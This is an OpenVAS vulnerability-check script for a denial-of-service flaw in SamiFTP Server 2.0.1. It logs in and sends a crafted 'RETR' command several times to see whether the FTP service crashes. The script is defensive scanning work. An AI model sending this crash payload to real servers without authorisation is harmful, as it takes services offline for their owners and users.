###############################################################################
# OpenVAS Vulnerability Test
#
# SamiFTP Server 'RETR' Command Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803717");
  script_version("2022-04-25T14:50:49+0000");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-04-25 14:50:49 +0000 (Mon, 25 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-06-13 15:16:51 +0530 (Thu, 13 Jun 2013)");
  script_name("SamiFTP Server 'RETR' Command Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/26133");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60513");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/windows/sami-ftp-server-201-retr-denial-of-service");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/samiftp/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause
  a denial of service.");

  script_tag(name:"affected", value:"SamiFTP Server version 2.0.1.");

  script_tag(name:"insight", value:"The flaw is due to an error while parsing RETR command, which can
  be exploited to crash the FTP service by sending crafted data via 'RETR' command.");

  script_tag(name:"solution", value:"Upgrade to version 2.0.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"SamiFTP Server is prone to a denial of service (DoS) vulnerability.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

samiPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:samiPort);
if(!banner || "220 Features p a" >!< banner){
  exit(0);
}

soc = open_sock_tcp(samiPort);
if(!soc){
  exit(0);
}

banner = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if(!banner || "220 Features p a" >!< banner){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

flag = 0;

for(i=0; i<3 ; i++)
{
  soc1 = open_sock_tcp(samiPort);

  if(!soc1 && flag == 0){
    exit(0);
  }

  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(!ftplogin && flag == 0){
    exit(0);
  }

  flag = 1;
  if (!ftplogin || !soc1){
    security_message(port:samiPort);
    exit(0);
  }

  send(socket:soc1, data:string("RETR \x41", '\r\n'));
  ftp_close(socket:soc1);
}

sleep(3);

soc2 = open_sock_tcp(samiPort);
if(!soc2){
  security_message(port:samiPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
ftp_close(socket:soc2);

if(!resp || "220 Features p a" >!< resp) {
  security_message(port:samiPort);
  exit(0);
}
